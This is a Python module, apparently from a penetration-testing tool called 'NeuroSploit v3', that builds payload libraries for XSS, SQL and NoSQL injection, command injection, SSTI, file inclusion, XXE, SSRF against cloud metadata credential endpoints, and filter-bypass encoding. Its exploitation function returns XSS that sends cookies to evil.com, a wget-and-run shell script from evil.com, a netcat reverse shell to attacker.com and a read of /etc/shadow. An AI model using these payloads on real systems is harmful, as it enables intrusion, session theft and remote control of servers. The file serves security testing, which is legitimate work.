"""
NeuroSploit v3 - Dynamic Payload Generator

Generates context-aware payloads for vulnerability testing.
"""
from typing import List, Dict, Any, Optional
import json
from pathlib import Path


class PayloadGenerator:
    """
    Generates payloads for vulnerability testing.

    Features:
    - Extensive payload libraries per vulnerability type
    - Context-aware payload selection (WAF bypass, encoding)
    - Dynamic payload generation based on target info
    """

    def __init__(self):
        self.payload_libraries = self._load_payload_libraries()

    def _load_payload_libraries(self) -> Dict[str, List[str]]:
        """Load comprehensive payload libraries"""
        return {
            # XSS Payloads
            "xss_reflected": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<body onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=\"javascript:alert('XSS')\">",
                "<input onfocus=alert('XSS') autofocus>",
                "<marquee onstart=alert('XSS')>",
                "<details open ontoggle=alert('XSS')>",
                "<video><source onerror=alert('XSS')>",
                "'-alert('XSS')-'",
                "\"-alert('XSS')-\"",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "<img src=x onerror=alert(document.domain)>",
                "<svg/onload=alert('XSS')>",
                "<body/onload=alert('XSS')>",
                "<<script>alert('XSS')//<</script>",
                "<ScRiPt>alert('XSS')</sCrIpT>",
                "%3Cscript%3Ealert('XSS')%3C/script%3E",
                "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
            ],
            "xss_stored": [
                "<script>alert('StoredXSS')</script>",
                "<img src=x onerror=alert('StoredXSS')>",
                "<svg onload=alert('StoredXSS')>",
                "javascript:alert('StoredXSS')",
                "<a href=javascript:alert('StoredXSS')>click</a>",
            ],
            "xss_dom": [
                "#<script>alert('DOMXSS')</script>",
                "#\"><script>alert('DOMXSS')</script>",
                "javascript:alert('DOMXSS')",
                "#'-alert('DOMXSS')-'",
            ],

            # SQL Injection Payloads
            "sqli_error": [
                "'",
                "\"",
                "' OR '1'='1",
                "' OR '1'='1'--",
                "' OR '1'='1'/*",
                "\" OR \"1\"=\"1",
                "1' AND '1'='1",
                "1 AND 1=1",
                "' AND ''='",
                "admin'--",
                "') OR ('1'='1",
                "' UNION SELECT NULL--",
                "1' ORDER BY 1--",
                "1' ORDER BY 100--",
                "'; WAITFOR DELAY '0:0:5'--",
                "1; SELECT SLEEP(5)--",
            ],
            "sqli_union": [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT username,password FROM users--",
                "' UNION ALL SELECT NULL,NULL,NULL--",
                "' UNION SELECT @@version--",
                "' UNION SELECT version()--",
                "1 UNION SELECT * FROM information_schema.tables--",
            ],
            "sqli_blind": [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND 'a'='a",
                "' AND 'a'='b",
                "1' AND (SELECT COUNT(*) FROM users)>0--",
                "' AND SUBSTRING(username,1,1)='a'--",
            ],
            "sqli_time": [
                "'; WAITFOR DELAY '0:0:5'--",
                "' AND SLEEP(5)--",
                "' AND (SELECT SLEEP(5))--",
                "'; SELECT pg_sleep(5)--",
                "' AND BENCHMARK(10000000,SHA1('test'))--",
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            ],

            # Command Injection
            "command_injection": [
                "; id",
                "| id",
                "|| id",
                "& id",
                "&& id",
                "`id`",
                "$(id)",
                "; whoami",
                "| whoami",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "; ls -la",
                "& dir",
                "| type C:\\Windows\\win.ini",
                "; ping -c 3 127.0.0.1",
                "| ping -n 3 127.0.0.1",
                "\n/bin/cat /etc/passwd",
                "a]); system('id'); //",
            ],

            # SSTI Payloads
            "ssti": [
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                "<%= 7*7 %>",
                "{{7*'7'}}",
                "{{config}}",
                "{{self}}",
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
                "{{config.items()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "#{T(java.lang.System).getenv()}",
                "${{7*7}}",
            ],

            # NoSQL Injection
            "nosql_injection": [
                '{"$gt": ""}',
                '{"$ne": ""}',
                '{"$regex": ".*"}',
                "admin'||'1'=='1",
                '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
                '{"$where": "1==1"}',
                "true, $where: '1 == 1'",
            ],

            # LFI Payloads
            "lfi": [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "..%2f..%2f..%2fetc/passwd",
                "..%252f..%252f..%252fetc/passwd",
                "/etc/passwd",
                "file:///etc/passwd",
                "....\\....\\....\\windows\\win.ini",
                "..\\..\\..\\windows\\win.ini",
                "/proc/self/environ",
                "php://filter/convert.base64-encode/resource=index.php",
                "php://input",
                "expect://id",
                "/var/log/apache2/access.log",
                "C:\\Windows\\System32\\drivers\\etc\\hosts",
            ],

            # RFI Payloads
            "rfi": [
                "http://evil.com/shell.txt",
                "https://evil.com/shell.txt?",
                "//evil.com/shell.txt",
                "http://evil.com/shell.txt%00",
            ],

            # Path Traversal
            "path_traversal": [
                "../",
                "..\\",
                "....//",
                "....\\\\",
                "%2e%2e%2f",
                "%2e%2e/",
                "..%2f",
                "%2e%2e%5c",
                "..%255c",
                "..%c0%af",
                "..%c1%9c",
            ],

            # XXE Payloads
            "xxe": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><foo></foo>',
            ],

            # SSRF Payloads
            "ssrf": [
                "http://127.0.0.1",
                "http://localhost",
                "http://169.254.169.254/latest/meta-data/",
                "http://[::1]",
                "http://0.0.0.0",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/metadata/v1/",
                "http://127.0.0.1:22",
                "http://127.0.0.1:3306",
                "http://127.0.0.1:6379",
                "file:///etc/passwd",
                "dict://127.0.0.1:6379/INFO",
                "gopher://127.0.0.1:6379/_INFO",
            ],
            "ssrf_cloud": [
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                "http://169.254.169.254/metadata/v1.json",
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            ],

            # Open Redirect
            "open_redirect": [
                "https://evil.com",
                "//evil.com",
                "/\\evil.com",
                "https:evil.com",
                "//evil.com/%2f%2e%2e",
                "////evil.com",
                "https://evil.com@trusted.com",
                "javascript:alert('redirect')",
            ],

            # CORS Test Origins
            "cors_misconfig": [
                "https://evil.com",
                "https://attacker.com",
                "null",
                "https://trusted.com.evil.com",
                "https://trustedcom.evil.com",
            ],

            # JWT Manipulation
            "jwt_manipulation": [
                '{"alg":"none"}',
                '{"alg":"HS256"}',  # Test algorithm confusion
                '{"alg":"RS256"}',
            ],

            # Auth Bypass
            "auth_bypass": [
                "' OR '1'='1",
                "admin'--",
                "admin' #",
                "admin'/*",
                "' OR 1=1--",
                "admin",
                "administrator",
                "' OR ''='",
            ],

            # IDOR
            "idor": [
                "1",
                "2",
                "0",
                "-1",
                "999999",
                "admin",
                "test",
                "../1",
            ],
        }

    async def get_payloads(
        self,
        vuln_type: str,
        endpoint: Any,
        context: Dict[str, Any]
    ) -> List[str]:
        """
        Get payloads for a vulnerability type.

        Args:
            vuln_type: Type of vulnerability to test
            endpoint: Target endpoint
            context: Additional context (technologies, WAF, etc.)

        Returns:
            List of payloads to test
        """
        base_payloads = self.payload_libraries.get(vuln_type, [])

        if not base_payloads:
            # Fallback to similar type
            for key in self.payload_libraries:
                if vuln_type.startswith(key.split('_')[0]):
                    base_payloads = self.payload_libraries[key]
                    break

        # If WAF detected, add encoded variants
        if context.get("waf_detected"):
            base_payloads = self._add_waf_bypasses(base_payloads, vuln_type)

        # Limit payloads based on scan depth
        depth = context.get("depth", "standard")
        limits = {
            "quick": 3,
            "standard": 10,
            "thorough": 20,
            "exhaustive": len(base_payloads)
        }
        limit = limits.get(depth, 10)

        return base_payloads[:limit]

    async def get_exploitation_payloads(
        self,
        vuln_type: str,
        initial_payload: str,
        context: Dict[str, Any]
    ) -> List[str]:
        """
        Generate exploitation payloads after initial vulnerability confirmation.
        """
        exploitation_payloads = []

        if "xss" in vuln_type:
            exploitation_payloads = [
                "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
                "<img src=x onerror=fetch('http://evil.com/'+document.cookie)>",
                "<script>new Image().src='http://evil.com/?c='+document.cookie</script>",
            ]
        elif "sqli" in vuln_type:
            exploitation_payloads = [
                "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                "' UNION SELECT column_name,NULL FROM information_schema.columns--",
                "' UNION SELECT username,password FROM users--",
            ]
        elif "command" in vuln_type:
            exploitation_payloads = [
                "; cat /etc/shadow",
                "; wget http://evil.com/shell.sh -O /tmp/s && bash /tmp/s",
                "| nc -e /bin/bash attacker.com 4444",
            ]
        elif "lfi" in vuln_type:
            exploitation_payloads = [
                "php://filter/convert.base64-encode/resource=../config.php",
                "/proc/self/environ",
                "/var/log/apache2/access.log",
            ]
        elif "ssrf" in vuln_type:
            exploitation_payloads = [
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://127.0.0.1:6379/INFO",
                "http://127.0.0.1:3306/",
            ]

        return exploitation_payloads

    def _add_waf_bypasses(self, payloads: List[str], vuln_type: str) -> List[str]:
        """Add WAF bypass variants to payloads"""
        bypassed = []
        for payload in payloads:
            bypassed.append(payload)
            # URL encoding
            bypassed.append(payload.replace("<", "%3C").replace(">", "%3E"))
            # Double URL encoding
            bypassed.append(payload.replace("<", "%253C").replace(">", "%253E"))
            # Case variation
            if "<script" in payload.lower():
                bypassed.append(payload.replace("script", "ScRiPt"))
        return bypassed
